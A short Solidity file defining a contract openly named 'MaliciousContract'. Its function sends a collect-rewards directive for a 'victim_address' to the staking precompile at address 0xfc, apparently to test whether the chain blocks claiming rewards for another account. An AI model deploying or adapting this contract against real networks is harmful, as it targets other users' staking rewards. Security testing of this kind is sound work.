//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract MaliciousContract {
    //0 => createValidator
    //1 => editValidator
    //2 => delegate
    //3 => unDelegate
    //4 => collectRewards
    enum Directive{
        CREATE_VALIDATOR,
        EDIT_VALIDATOR,
        DELEGATE,
        UNDELEGATE,
        COLLECT_REWARDS
    }

    function collectRewards(address victim_address) public returns (uint256 result) {
        bytes memory encodedInput = abi.encode(uint8(Directive.COLLECT_REWARDS), victim_address);
        bytes32 sizeOfInput;
        assembly {
            let memPtr := mload(0x40)
            sizeOfInput := add(mload(encodedInput), 32)
            result := call(gas(), 0xfc, 0x0, encodedInput, sizeOfInput, memPtr, 0x20)
        }
    }
}
